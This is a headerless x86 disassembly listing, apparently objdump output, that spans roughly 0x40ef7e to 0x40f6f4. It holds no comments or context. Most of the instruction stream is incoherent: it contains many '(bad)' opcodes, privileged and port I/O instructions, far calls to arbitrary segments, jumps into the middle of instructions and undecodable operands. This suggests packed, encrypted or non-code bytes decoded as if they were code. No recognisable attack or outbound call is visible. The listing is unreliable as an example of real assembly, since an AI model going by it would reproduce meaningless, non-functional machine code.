  40ef7e:	rcl    BYTE PTR [edx-0x15],cl
  40ef81:	dec    esi
  40ef82:	push   ebx
  40ef83:	shl    DWORD PTR [esi],1
  40ef85:	jmp    0x40f004
  40ef87:	xchg   edx,eax
  40ef88:	inc    edx
  40ef89:	dec    ebx
  40ef8a:	adc    dl,ch
  40ef8c:	push   cs
  40ef8d:	mov    dh,BYTE PTR [edx-0x321ee6b2]
  40ef93:	sbb    al,0xa8
  40ef95:	mov    DWORD PTR [edx-0x50],eax
  40ef98:	mov    esi,0x9dbd4cc6
  40ef9d:	mov    bl,0x55
  40ef9f:	das    
  40efa0:	scas   al,BYTE PTR es:[edi]
  40efa1:	cdq    
  40efa2:	pop    esi
  40efa3:	adc    bl,BYTE PTR [ebp-0x3be9e074]
  40efa9:	aam    0x9f
  40efab:	gs dec esp
  40efad:	pop    edi
  40efae:	xchg   esp,eax
  40efaf:	mul    esp
  40efb1:	mov    edi,0xe6e19ec3
  40efb6:	xor    eax,0xf3b38b7c
  40efbb:	xchg   edx,eax
  40efbc:	jne    0x40f018
  40efbe:	imul   ebx,edi,0xbfc8be04
  40efc4:	dec    ecx
  40efc5:	aad    0xf9
  40efc7:	(bad)
  40efca:	push   ecx
  40efcb:	and    BYTE PTR gs:[ebx+edi*4],dh
  40efcf:	outs   dx,BYTE PTR ds:[esi]
  40efd0:	pushf  
  40efd1:	jg     0x40f02d
  40efd3:	xchg   ebx,eax
  40efd4:	fidivr WORD PTR [ecx-0x7c]
  40efd7:	mov    cl,0x51
  40efd9:	sbb    dh,BYTE PTR [edi+eiz*4]
  40efdc:	js     0x40efc3
  40efde:	(bad)
  40efe2:	cdq    
  40efe3:	retf   0x631
  40efe6:	lods   eax,DWORD PTR ds:[esi]
  40efe7:	pop    ebp
  40efe8:	arpl   WORD PTR [eax],sp
  40efea:	xor    al,0x88
  40efec:	push   0xffb0b917
  40eff1:	or     bp,WORD PTR [esi-0x39]
  40eff5:	aam    0x53
  40eff7:	enter  0xcc0a,0xf9
  40effb:	or     DWORD PTR es:[eax+esi*2],ebp
  40efff:	mov    al,ds:0xf79c8dd7
  40f004:	(bad)  
  40f005:	dec    esi
  40f006:	mov    edx,0x75fca273
  40f00b:	ins    BYTE PTR es:[edi],dx
  40f00c:	shl    BYTE PTR [ebp-0x440466f3],cl
  40f012:	or     al,0xa7
  40f014:	fwait
  40f015:	jl     0x40f037
  40f017:	push   0xec539dc8
  40f01c:	dec    esi
  40f01d:	fdiv   st(4),st
  40f01f:	nop
  40f020:	fild   WORD PTR [ecx-0x3858493b]
  40f026:	fdivr  DWORD PTR [ebx+0xe7fe328]
  40f02c:	lds    eax,FWORD PTR [edi-0x42]
  40f02f:	mov    ch,0xc6
  40f031:	adc    eax,0x36cc15b4
  40f036:	adc    edx,DWORD PTR [ebx+0xe792528]
  40f03c:	retf   0xed8e
  40f03f:	mov    al,ds:0xd6de24e4
  40f044:	add    DWORD PTR [edi],esp
  40f046:	ss sar edi,0x5b
  40f04a:	cmp    eax,0x54ad491a
  40f04f:	push   0xdd44b8b1
  40f054:	mov    BYTE PTR [ebx+0x2ae6b801],ah
  40f05a:	clc    
  40f05b:	sar    BYTE PTR [edi],cl
  40f05d:	mov    dl,0x56
  40f05f:	inc    edx
  40f060:	outs   dx,BYTE PTR ds:[esi]
  40f061:	fsub   DWORD PTR [ebx+0x10]
  40f064:	ins    DWORD PTR es:[edi],dx
  40f065:	mov    dl,0xd3
  40f067:	out    dx,al
  40f068:	das    
  40f069:	mov    ebp,0xdb45e206
  40f06e:	aaa    
  40f06f:	in     eax,0x34
  40f071:	leave  
  40f072:	daa    
  40f073:	pop    ecx
  40f074:	pop    edx
  40f075:	add    eax,0x3cd0bbca
  40f07a:	out    dx,al
  40f07b:	(bad)  
  40f07c:	pop    edx
  40f07d:	(bad)  
  40f07f:	(bad)  
  40f081:	rol    dl,1
  40f083:	test   ecx,edx
  40f085:	mov    ch,0x86
  40f087:	xor    eax,DWORD PTR [ecx+eiz*2-0x7058d070]
  40f08e:	outs   dx,BYTE PTR ds:[esi]
  40f08f:	mov    ebx,0x3b61a9be
  40f094:	or     dh,BYTE PTR [ecx+0x95c8e92]
  40f09a:	and    eax,0x1e531378
  40f09f:	or     ecx,DWORD PTR [eax+0x5fdb9f82]
  40f0a5:	mov    ecx,0x21658a57
  40f0aa:	and    DWORD PTR [ebx-0x6c],0xffffffde
  40f0ae:	adc    eax,0x1d7aef8
  40f0b3:	and    edx,DWORD PTR [edi]
  40f0b5:	pop    ebx
  40f0b6:	inc    edx
  40f0b7:	clc    
  40f0b8:	add    esp,DWORD PTR [eax+0x4ad76af9]
  40f0be:	rcl    edi,0xea
  40f0c1:	dec    DWORD PTR [edi-0x55b66f92]
  40f0c7:	cdq    
  40f0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0c9:	sti    
  40f0ca:	add    eax,0x2f344c45
  40f0cf:	hlt    
  40f0d0:	lock stos DWORD PTR es:[edi],eax
  40f0d2:	outs   dx,BYTE PTR ds:[esi]
  40f0d3:	mov    ebx,0x27d7865c
  40f0d8:	into   
  40f0d9:	cli    
  40f0da:	out    dx,eax
  40f0db:	ds and al,0xae
  40f0de:	les    ecx,FWORD PTR [ecx]
  40f0e0:	cmp    bh,BYTE PTR [esi]
  40f0e2:	ror    DWORD PTR [esi],1
  40f0e4:	shr    DWORD PTR [esi-0x2b],0x8c
  40f0e8:	ret    0x6e4e
  40f0eb:	xor    ecx,edi
  40f0ed:	aas    
  40f0ee:	xchg   esp,eax
  40f0ef:	bound  eax,QWORD PTR [esi+0x18f66359]
  40f0f5:	daa    
  40f0f6:	jbe    0x40f0c8
  40f0f8:	lock dec ebx
  40f0fa:	out    dx,eax
  40f0fb:	sub    edx,esi
  40f0fd:	jp     0x40f092
  40f0ff:	mov    ecx,0xbe936351
  40f104:	push   0x6b
  40f106:	jbe    0x40f13d
  40f108:	test   BYTE PTR [edx+ebx*4-0x46],0x3e
  40f10d:	cs popa 
  40f10f:	jne    0x40f0e0
  40f111:	push   ds
  40f112:	dec    ebx
  40f113:	mov    dh,0xe8
  40f115:	cs add eax,0xe73ed298
  40f11b:	(bad)  
  40f11c:	test   eax,0x7a2867d4
  40f122:	mov    al,ds:0x4aee4b7
  40f127:	xchg   edx,eax
  40f128:	mov    edx,0x6d7c2e9a
  40f12d:	xchg   ebp,eax
  40f12e:	mov    DWORD PTR [edi+0x8e30119],esi
  40f134:	mov    edi,0xe8ad2804
  40f139:	jge    0x40f0cc
  40f13b:	or     DWORD PTR [eax],0x6d6623f9
  40f141:	jg     0x40f0fa
  40f143:	push   es
  40f144:	dec    eax
  40f145:	call   0x4b56:0x5b096be6
  40f14c:	(bad)  
  40f14d:	xchg   edx,eax
  40f14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f14f:	mov    DWORD PTR [edi],ecx
  40f151:	fnsave [edx+0x11517a76]
  40f157:	jno    0x40f1d0
  40f159:	ret    0x2000
  40f15c:	popa   
  40f15d:	xchg   edx,eax
  40f15e:	and    al,0xc0
  40f160:	fs icebp 
  40f162:	test   eax,0x2e748b1b
  40f167:	ss cdq 
  40f169:	dec    ecx
  40f16a:	xor    ecx,DWORD PTR [ecx-0x35763f31]
  40f170:	rcr    DWORD PTR [bx-0x7c19],cl
  40f175:	add    al,0x7e
  40f177:	and    DWORD PTR [edx],ebx
  40f179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f17a:	mov    DWORD PTR [edx+0x75],eax
  40f17d:	mov    eax,DWORD PTR [edx-0x6c]
  40f180:	lock dec BYTE PTR [ecx]
  40f183:	leave  
  40f184:	lock sti 
  40f186:	dec    ecx
  40f187:	xchg   esi,eax
  40f188:	lock jb 0x40f1a8
  40f18b:	ss jp  0x40f161
  40f18e:	data16 fimul WORD PTR [edx-0x26]
  40f192:	hlt    
  40f193:	loop   0x40f1be
  40f195:	gs sbb ebx,ebp
  40f198:	pop    ebp
  40f199:	hlt    
  40f19a:	int    0x49
  40f19c:	push   cs
  40f19d:	push   ds
  40f19e:	cmp    eax,0xd15880b2
  40f1a3:	in     al,dx
  40f1a4:	adc    ebp,DWORD PTR [edx-0x41]
  40f1a7:	retf   0xa4c9
  40f1aa:	dec    DWORD PTR [esi-0x329c7e87]
  40f1b0:	push   0x5436c066
  40f1b5:	test   eax,0x10e7acfc
  40f1ba:	imul   esi,ebp,0x675000bf
  40f1c0:	aas    
  40f1c1:	jno    0x40f208
  40f1c3:	pop    eax
  40f1c4:	loope  0x40f1b3
  40f1c6:	push   ds
  40f1c7:	jp     0x40f174
  40f1c9:	adc    DWORD PTR [ebp-0x62],edi
  40f1cc:	in     al,0x7b
  40f1ce:	or     eax,0xe23baabc
  40f1d3:	icebp  
  40f1d4:	add    ecx,DWORD PTR [edi-0x7a]
  40f1d7:	fs cwde 
  40f1d9:	jl     0x40f1e4
  40f1db:	fnstcw WORD PTR [ebx+0x4d703278]
  40f1e1:	aad    0x50
  40f1e3:	das    
  40f1e4:	mov    cl,0x25
  40f1e6:	jno    0x40f1d2
  40f1e8:	repz ror DWORD PTR [eax+0x292fe6b0],cl
  40f1ef:	int3   
  40f1f0:	push   0x10fed018
  40f1f5:	imul   edx,DWORD PTR [esi],0x66
  40f1f8:	add    al,0xc7
  40f1fa:	adc    eax,0x8c0615fa
  40f1ff:	mov    BYTE PTR [edx-0x587b4167],cl
  40f205:	es (bad) 
  40f208:	dec    edi
  40f209:	xchg   DWORD PTR es:[eax-0x74],eax
  40f20d:	leave  
  40f20e:	imul   edx,DWORD PTR [edx],0x44b00638
  40f214:	xor    dl,BYTE PTR [edi]
  40f216:	push   esp
  40f217:	xchg   ebx,eax
  40f218:	sub    eax,0xc05e3a88
  40f21d:	lods   eax,DWORD PTR ds:[esi]
  40f21e:	test   BYTE PTR [ebx+0x11588605],0xb8
  40f225:	fadd   DWORD PTR [edi-0x22]
  40f228:	mov    al,0x53
  40f22a:	in     al,0x92
  40f22c:	xchg   esp,eax
  40f22d:	cmp    eax,0x3b7c5b2f
  40f232:	fsubr  QWORD PTR [ebp+0x27983ca7]
  40f238:	cmp    al,0x20
  40f23a:	push   es
  40f23b:	pop    es
  40f23c:	dec    esi
  40f23d:	test   DWORD PTR [ebx+edi*8-0x7f7f2b4a],esp
  40f244:	rcr    DWORD PTR [ecx+0x13],cl
  40f247:	in     al,0xc6
  40f249:	jmp    0xd323dcfc
  40f24e:	mov    ah,bl
  40f250:	mov    bl,BYTE PTR [esi]
  40f252:	mov    cl,0xb9
  40f254:	cmp    bh,bl
  40f256:	shr    BYTE PTR [ecx+0x6befbf13],1
  40f25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f25d:	push   edx
  40f25e:	pop    es
  40f25f:	jle    0x40f1ff
  40f261:	in     eax,0x38
  40f263:	or     eax,0x94571bfa
  40f268:	xchg   BYTE PTR ds:[ecx-0x72],al
  40f26c:	sub    BYTE PTR [ebp-0x780a9899],dl
  40f272:	mov    cl,0x90
  40f274:	shl    ebp,cl
  40f276:	mov    esi,DWORD PTR [esi]
  40f278:	shr    BYTE PTR [eax],cl
  40f27a:	cs inc esi
  40f27c:	daa    
  40f27d:	sahf   
  40f27e:	push   0x66
  40f280:	dec    edi
  40f281:	ss push es
  40f283:	stos   BYTE PTR es:[edi],al
  40f284:	jnp    0x40f283
  40f286:	(bad)  
  40f287:	jle    0x40f21a
  40f289:	int    0x93
  40f28b:	cmp    al,0x9c
  40f28d:	add    al,0x4
  40f28f:	imul   ecx,DWORD PTR [esi],0x4b
  40f292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f293:	add    eax,DWORD PTR [edx+ecx*8]
  40f296:	outs   dx,DWORD PTR ds:[esi]
  40f297:	mov    edi,0x5583564c
  40f29c:	jb     0x40f2db
  40f29e:	aam    0x68
  40f2a0:	jmp    0xdcf0:0x10b0cd1f
  40f2a7:	jmp    0x40f2d2
  40f2a9:	xchg   BYTE PTR [esi*4-0x5e0f0104],cl
  40f2b0:	xchg   esi,eax
  40f2b1:	xor    DWORD PTR [eax+0x6f],esp
  40f2b4:	xchg   esp,eax
  40f2b5:	retf   
  40f2b6:	and    eax,DWORD PTR [edx+0x1b]
  40f2b9:	xor    al,0x1c
  40f2bb:	mov    ds:0x564f69b4,al
  40f2c0:	iret   
  40f2c1:	xor    eax,0xce423af9
  40f2c6:	or     ch,BYTE PTR [esi+0x65e8d8ba]
  40f2cc:	push   ds
  40f2cd:	add    esi,DWORD PTR [edi-0x7e1996e2]
  40f2d3:	fstp   DWORD PTR [edi-0x5d128963]
  40f2d9:	cmp    al,0x28
  40f2db:	pushf  
  40f2dc:	cld    
  40f2dd:	cmp    ch,BYTE PTR [ebx]
  40f2df:	sub    BYTE PTR [eax-0x596974d4],al
  40f2e5:	push   ds
  40f2e6:	mov    eax,ds:0xeffda754
  40f2eb:	pushf  
  40f2ec:	cmp    eax,0x3bf5bd10
  40f2f1:	add    bh,bh
  40f2f3:	mov    ah,BYTE PTR ds:0xa2e486e2
  40f2f9:	xor    al,0x99
  40f2fb:	push   ds
  40f2fc:	push   ebx
  40f2fd:	out    0xac,al
  40f2ff:	cld    
  40f300:	out    dx,al
  40f301:	fnsave [ecx+0x7a]
  40f304:	push   esi
  40f305:	nop
  40f306:	push   ds
  40f307:	imul   esi,DWORD PTR [eax+0x28],0x56
  40f30b:	inc    esp
  40f30c:	pushf  
  40f30d:	push   esp
  40f30e:	push   ds
  40f30f:	gs pop esp
  40f311:	mov    edi,0x88e5bccd
  40f316:	xchg   ebp,eax
  40f317:	mov    eax,0xbab4f365
  40f31c:	xchg   BYTE PTR [ebx-0x73],dl
  40f31f:	push   eax
  40f320:	cwde   
  40f321:	xchg   esp,eax
  40f322:	dec    ebx
  40f323:	xchg   esi,eax
  40f324:	(bad)  
  40f325:	icebp  
  40f326:	dec    edx
  40f327:	pop    es
  40f328:	add    DWORD PTR [ebp-0x63eec699],ecx
  40f32e:	xchg   BYTE PTR [esi],ch
  40f330:	cs popf 
  40f332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f334:	dec    ecx
  40f335:	loop   0x40f307
  40f337:	add    al,0xe1
  40f339:	mov    bh,0x91
  40f33b:	sbb    bl,BYTE PTR [edx+0x6c]
  40f33e:	push   ebx
  40f33f:	sub    al,0xa7
  40f341:	popf   
  40f342:	call   0xbeaa:0xf1aac3d8
  40f349:	ror    DWORD PTR [edi],cl
  40f34b:	scas   al,BYTE PTR es:[edi]
  40f34c:	not    al
  40f34e:	aaa    
  40f34f:	dec    edx
  40f350:	fisubr DWORD PTR [ebx+0xa]
  40f353:	jb     0x40f2da
  40f355:	pop    edx
  40f356:	pcmpeqw mm2,QWORD PTR [edx-0x4a]
  40f35a:	mov    ecx,0xbac572f5
  40f35f:	pop    ecx
  40f360:	push   cx
  40f362:	inc    edi
  40f363:	loope  0x40f388
  40f365:	je     0x40f317
  40f367:	lahf   
  40f368:	push   esp
  40f369:	push   edi
  40f36a:	mov    ds:0x2a154919,al
  40f36f:	pop    ebp
  40f370:	sub    dl,BYTE PTR [edi+ecx*8+0x68534856]
  40f377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f378:	lahf   
  40f379:	add    ecx,DWORD PTR [edi+0x41e163ab]
  40f37f:	and    eax,DWORD PTR [eax-0x3647134d]
  40f385:	xchg   ebp,eax
  40f386:	and    eax,0xd179d7d5
  40f38b:	std    
  40f38c:	(bad)  
  40f38d:	fistp  DWORD PTR [eax+0x6d5be744]
  40f393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f394:	push   ebp
  40f395:	xlat   BYTE PTR ds:[ebx]
  40f396:	sbb    DWORD PTR [edi],ecx
  40f398:	jnp    0x40f3c7
  40f39a:	in     al,0xc0
  40f39c:	not    BYTE PTR [ecx+esi*8]
  40f39f:	push   cs
  40f3a0:	mov    ah,0x10
  40f3a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a3:	stos   DWORD PTR es:[edi],eax
  40f3a4:	ret    
  40f3a5:	dec    edx
  40f3a6:	aad    0x73
  40f3a8:	dec    edi
  40f3a9:	aam    0x17
  40f3ab:	fdiv   st(7),st
  40f3ad:	idiv   BYTE PTR [ecx]
  40f3af:	outs   dx,DWORD PTR ds:[esi]
  40f3b0:	std    
  40f3b1:	push   edi
  40f3b2:	icebp  
  40f3b3:	mov    dh,0xe5
  40f3b5:	dec    ebp
  40f3b6:	and    DWORD PTR [eax+0x7a],ebp
  40f3b9:	cmp    bl,BYTE PTR [edx+0x1e69f2cd]
  40f3bf:	cdq    
  40f3c0:	test   al,0xb6
  40f3c2:	(bad)  
  40f3c4:	xor    bl,cl
  40f3c6:	(bad)  
  40f3c8:	pop    ebx
  40f3c9:	sti    
  40f3ca:	push   eax
  40f3cb:	xor    eax,0x4d28a16c
  40f3d0:	out    0x29,al
  40f3d2:	(bad)  
  40f3d3:	pusha  
  40f3d4:	and    ah,BYTE PTR [ebx+0x19]
  40f3d7:	(bad)  
  40f3d8:	or     al,0x5c
  40f3da:	jg     0x40f3a0
  40f3dc:	mov    eax,0x5eeeb2e9
  40f3e1:	ret    0x619
  40f3e4:	mov    ebx,0xde3d84a5
  40f3e9:	mov    ds:0x8542508b,al
  40f3ee:	xor    BYTE PTR [edx+0x39f26964],bl
  40f3f4:	inc    esp
  40f3f5:	hlt    
  40f3f6:	mov    fs,esi
  40f3f8:	lea    edi,[eax]
  40f3fa:	xchg   edi,esi
  40f3fc:	xchg   ebx,eax
  40f3fd:	std    
  40f3fe:	pop    ebx
  40f3ff:	and    al,0x4b
  40f401:	lods   eax,DWORD PTR ds:[esi]
  40f402:	adc    DWORD PTR [ebx+ebp*8-0x4b3132ab],esi
  40f409:	rol    DWORD PTR [ebx-0x73],0xed
  40f40d:	inc    ecx
  40f40e:	pop    ecx
  40f40f:	loopne 0x40f435
  40f411:	inc    edx
  40f412:	mov    edi,0xa58d39da
  40f417:	fcmove st,st(5)
  40f419:	push   edi
  40f41a:	retf   0xc00
  40f41d:	mov    ds:0x40555ce8,al
  40f422:	(bad)  
  40f423:	outs   dx,BYTE PTR ds:[esi]
  40f424:	push   edx
  40f425:	pop    ecx
  40f426:	out    0xfd,al
  40f428:	call   0x2fc251a
  40f42d:	das    
  40f42e:	call   0x96df31e5
  40f433:	pop    ecx
  40f434:	xlat   BYTE PTR ds:[ebx]
  40f435:	jae    0x40f3d0
  40f437:	xchg   ebx,eax
  40f438:	retf   
  40f439:	cmp    al,0x37
  40f43b:	js     0x40f439
  40f43d:	xchg   DWORD PTR [edi],ebx
  40f43f:	ds sbb cl,ch
  40f442:	push   esi
  40f443:	mov    ds:0xe539944b,eax
  40f448:	adc    DWORD PTR [ebp+edx*2+0x44b3c2ba],0x6f
  40f450:	jbe    0x40f4c7
  40f452:	sub    ah,bl
  40f454:	je     0x40f4a5
  40f456:	ins    DWORD PTR es:[edi],dx
  40f457:	sub    edi,DWORD PTR [edx-0x6f47208c]
  40f45d:	stos   DWORD PTR es:[edi],eax
  40f45e:	sti    
  40f45f:	fsubr  DWORD PTR [eax+0x73407ea7]
  40f465:	or     ecx,0xffffff9d
  40f468:	sub    eax,DWORD PTR [esi]
  40f46a:	call   0xf1327f51
  40f46f:	sub    DWORD PTR [edx],edi
  40f471:	pop    ebp
  40f472:	pop    ecx
  40f473:	mov    bl,0xdf
  40f475:	xchg   esp,eax
  40f476:	pop    ebx
  40f477:	pop    ecx
  40f478:	loop   0x40f460
  40f47a:	test   al,0x2
  40f47c:	popf   
  40f47d:	inc    ebx
  40f47e:	mov    BYTE PTR [eax+0x7b],0x7
  40f482:	cdq    
  40f483:	cwde   
  40f484:	scas   eax,DWORD PTR es:[edi]
  40f485:	push   ebx
  40f486:	add    eax,edx
  40f488:	arpl   WORD PTR [edx-0x34ec9bda],ax
  40f48e:	inc    edi
  40f48f:	dec    edi
  40f490:	push   0xffffffa1
  40f492:	inc    eax
  40f493:	pop    esp
  40f494:	adc    dl,0x42
  40f497:	into   
  40f498:	rcl    BYTE PTR [edi+0x35],0x6a
  40f49c:	sbb    al,0xa0
  40f49e:	cmc    
  40f49f:	jns    0x40f496
  40f4a1:	mov    esi,0x7fe48733
  40f4a6:	pushf  
  40f4a7:	out    dx,al
  40f4a8:	and    eax,0x75e0fada
  40f4ad:	pop    edi
  40f4ae:	(bad)  [ebp+0x6f93cfeb]
  40f4b4:	push   edi
  40f4b5:	xchg   esp,eax
  40f4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b8:	dec    ebx
  40f4b9:	dec    edi
  40f4ba:	(bad)  
  40f4bb:	cmc    
  40f4bc:	ror    cl,0x4a
  40f4bf:	jp     0x40f4b8
  40f4c1:	jo     0x40f4ce
  40f4c3:	fidivr WORD PTR [eax+0x3]
  40f4c6:	adc    edx,esi
  40f4c8:	call   0xf06e:0x60650fec
  40f4cf:	push   ebx
  40f4d0:	or     ch,ah
  40f4d2:	dec    ebx
  40f4d3:	ins    DWORD PTR es:[edi],dx
  40f4d4:	sub    eax,DWORD PTR [ecx+0x6fe78ab9]
  40f4da:	(bad)  
  40f4db:	mov    dh,0xf2
  40f4dd:	mov    dh,0xa0
  40f4df:	xchg   ebp,eax
  40f4e0:	cwde   
  40f4e1:	xchg   ecx,eax
  40f4e2:	cmp    dh,ah
  40f4e4:	add    al,0x94
  40f4e6:	mov    ch,0x8d
  40f4e8:	mov    dl,0x23
  40f4ea:	or     al,0xe1
  40f4ec:	setb   BYTE PTR [esi+eiz*8]
  40f4f0:	mov    ah,0x46
  40f4f2:	jmp    0x40f489
  40f4f4:	iret   
  40f4f5:	mov    ch,0x18
  40f4f7:	cwde   
  40f4f8:	stos   BYTE PTR es:[edi],al
  40f4f9:	into   
  40f4fa:	inc    ebp
  40f4fb:	aad    0x91
  40f4fd:	cmc    
  40f4fe:	push   edi
  40f4ff:	ror    DWORD PTR [ebp+0x1dd35905],1
  40f505:	loope  0x40f48c
  40f507:	imul   eax,DWORD PTR [edi-0x72],0xfad3513d
  40f50e:	and    DWORD PTR [esi-0x1e],esi
  40f511:	fnsave [edi-0x7283d2f4]
  40f517:	scas   al,BYTE PTR es:[edi]
  40f518:	pop    ebx
  40f519:	sahf   
  40f51a:	inc    edi
  40f51b:	xchg   edx,eax
  40f51c:	xchg   ebx,eax
  40f51d:	loope  0x40f58d
  40f51f:	daa    
  40f520:	js     0x40f562
  40f522:	bound  ecx,QWORD PTR [esi-0x5111630]
  40f528:	add    cl,ch
  40f52a:	ret    0x9485
  40f52d:	dec    edi
  40f52e:	fmul   DWORD PTR [ebx-0x2]
  40f531:	xchg   ebx,eax
  40f532:	dec    ecx
  40f533:	sbb    BYTE PTR [ecx],al
  40f535:	std    
  40f536:	mov    ebp,0x4e6aafdc
  40f53b:	ins    BYTE PTR es:[edi],dx
  40f53c:	mov    dl,0x89
  40f53e:	or     ch,al
  40f540:	xchg   edi,eax
  40f541:	mov    ?,WORD PTR [edi-0x39]
  40f544:	xor    DWORD PTR [ebx+0x5c8fdb32],ebx
  40f54a:	and    DWORD PTR [ebx-0x17a50a73],eax
  40f550:	les    eax,FWORD PTR [ebx-0x72]
  40f553:	retf   0x41c1
  40f556:	xchg   BYTE PTR [eax-0xf5db1b4],dl
  40f55c:	xor    esp,DWORD PTR [ecx]
  40f55e:	(bad)  
  40f560:	mov    WORD PTR [ecx],?
  40f562:	in     eax,dx
  40f563:	sbb    esp,edi
  40f565:	dec    edi
  40f566:	stos   BYTE PTR es:[edi],al
  40f567:	dec    ecx
  40f568:	icebp  
  40f569:	(bad)  
  40f56a:	mov    eax,ds:0x48c04daa
  40f56f:	test   al,0x20
  40f571:	int    0x8c
  40f573:	dec    esi
  40f574:	add    BYTE PTR [edx-0x6f],ch
  40f577:	jmp    0x518fbe6
  40f57c:	shl    BYTE PTR [esi-0x640e41ea],cl
  40f582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f583:	mov    cl,0x72
  40f585:	mov    bl,0x51
  40f587:	int    0x5d
  40f589:	fst    QWORD PTR [ecx]
  40f58b:	sbb    BYTE PTR [ebx],bh
  40f58d:	out    dx,eax
  40f58e:	daa    
  40f58f:	pop    edi
  40f590:	fcmovb st,st(5)
  40f592:	jne    0x40f52e
  40f594:	pusha  
  40f595:	pop    edx
  40f596:	jmp    0x51e00828
  40f59b:	push   edx
  40f59c:	fs out 0xa2,al
  40f59f:	push   edi
  40f5a0:	daa    
  40f5a1:	test   BYTE PTR [edi-0xfca4fa0],al
  40f5a7:	push   es
  40f5a8:	(bad)  
  40f5a9:	mov    ds:0x197102ab,eax
  40f5ae:	xchg   ebp,eax
  40f5af:	scas   eax,DWORD PTR es:[edi]
  40f5b0:	sbb    ah,BYTE PTR ds:0x39c12a8c
  40f5b6:	mov    bh,0x16
  40f5b8:	pop    ecx
  40f5b9:	popa   
  40f5ba:	shr    DWORD PTR [ebx],cl
  40f5bc:	call   0x8b26:0x72f2ce6c
  40f5c3:	cld    
  40f5c4:	push   ss
  40f5c5:	iret   
  40f5c6:	push   ss
  40f5c7:	scas   eax,DWORD PTR es:[edi]
  40f5c8:	sti    
  40f5c9:	dec    esi
  40f5ca:	cmp    ah,0xb8
  40f5cd:	adc    al,BYTE PTR [edi+0x398d4f19]
  40f5d3:	dec    ecx
  40f5d4:	mov    esp,0x2b447654
  40f5d9:	sar    DWORD PTR [esi],1
  40f5db:	xor    bl,BYTE PTR [ebx+0x3f83b8b9]
  40f5e1:	push   esp
  40f5e2:	mov    ds:0x28823734,eax
  40f5e7:	jmp    0x40f5c8
  40f5e9:	ss sbb BYTE PTR ss:0xa58fec53,al
  40f5f1:	mov    ah,ch
  40f5f3:	push   0xffffffa1
  40f5f5:	or     eax,DWORD PTR [ecx]
  40f5f7:	and    BYTE PTR [edx+0x5a],dl
  40f5fa:	mov    BYTE PTR [edi-0x73],bh
  40f5fd:	xchg   esp,eax
  40f5fe:	xor    cl,ch
  40f600:	add    eax,0x33d9f961
  40f605:	xor    al,BYTE PTR [edx+ebp*1-0x80]
  40f609:	xor    edi,ecx
  40f60b:	pushf  
  40f60c:	imul   eax,DWORD PTR [ecx+0x348ac1e7],0xbe4e2eaf
  40f616:	ror    DWORD PTR [ecx+0x4ab4eee1],0x14
  40f61d:	and    BYTE PTR [ecx-0x28],bl
  40f620:	xchg   esi,eax
  40f621:	mov    esp,DWORD PTR [esi]
  40f623:	sub    esp,ecx
  40f625:	dec    edi
  40f626:	dec    edx
  40f627:	mov    ch,0x7f
  40f629:	sbb    dl,BYTE PTR [ecx-0x11]
  40f62c:	and    al,0x37
  40f62e:	and    DWORD PTR [esi-0x7d],0xa6c866d5
  40f635:	mov    ebp,0x1c3d82e0
  40f63a:	(bad)  
  40f63b:	adc    BYTE PTR [ecx-0x1b],ah
  40f63e:	loopne 0x40f617
  40f640:	loope  0x40f647
  40f642:	call   0xd887:0xcbf0da17
  40f649:	sub    BYTE PTR [eax],al
  40f64b:	test   DWORD PTR [ebx],0x23f33e20
  40f651:	out    0x1d,al
  40f653:	xor    al,0x5d
  40f655:	mov    ebx,ebp
  40f657:	stos   DWORD PTR es:[edi],eax
  40f658:	int3   
  40f659:	call   0xa7aa:0xc14b2efe
  40f660:	cwde   
  40f661:	adc    BYTE PTR [edx+0x44],0x40
  40f665:	ror    BYTE PTR [ebx+ebx*4-0xd],0xee
  40f66a:	mov    dl,0xa1
  40f66c:	push   ebx
  40f66d:	cmp    ecx,DWORD PTR [edi+ebx*2+0x907b975]
  40f674:	fnstsw WORD PTR [esi]
  40f676:	shl    DWORD PTR [eax],1
  40f678:	lahf   
  40f679:	xchg   DWORD PTR ds:0xdacf8485,esi
  40f67f:	xor    dl,BYTE PTR [edi+esi*1-0x4f]
  40f683:	or     eax,DWORD PTR ds:0x44b59409
  40f689:	mov    ds:0x674df9c9,al
  40f68e:	jmp    0x43ee64a3
  40f693:	adc    edi,ebx
  40f695:	repnz es das 
  40f698:	setno  BYTE PTR [ebx-0x71d8c197]
  40f69f:	mov    ?,WORD PTR [esp+edx*4]
  40f6a2:	call   0x93c2c01a
  40f6a7:	out    dx,eax
  40f6a8:	neg    dh
  40f6aa:	sbb    DWORD PTR [eax],edi
  40f6ac:	test   al,0x4c
  40f6ae:	pop    ebp
  40f6af:	push   ebx
  40f6b0:	mov    ecx,0x4f61bfc5
  40f6b5:	push   esp
  40f6b6:	jns    0x40f737
  40f6b8:	cdq    
  40f6b9:	pop    edx
  40f6ba:	fidivr DWORD PTR [ecx+0x7d]
  40f6bd:	adc    esp,DWORD PTR [edi]
  40f6bf:	(bad)  
  40f6c0:	fmul   st(2),st
  40f6c2:	aad    0xd7
  40f6c4:	retf   0xab8a
  40f6c7:	(bad)  
  40f6c8:	xchg   BYTE PTR [ebp-0x69515508],bl
  40f6ce:	enter  0xebfc,0xcd
  40f6d2:	in     eax,0xd8
  40f6d4:	dec    esp
  40f6d5:	mov    edi,ss
  40f6d7:	or     ah,BYTE PTR ds:[edx-0x4803ab1a]
  40f6de:	ret    0xd34e
  40f6e1:	js     0x40f750
  40f6e3:	lock xchg edx,eax
  40f6e5:	lahf   
  40f6e6:	sub    BYTE PTR [edi],bl
  40f6e8:	mov    al,0x90
  40f6ea:	hlt    
  40f6eb:	ret    
  40f6ec:	jge    0x40f75e
  40f6ee:	mov    dh,0xe9
  40f6f0:	hlt    
  40f6f1:	pop    eax
  40f6f2:	inc    ebp
  40f6f3:	das    
  40f6f4:	cmp    edx,0x575b09d1
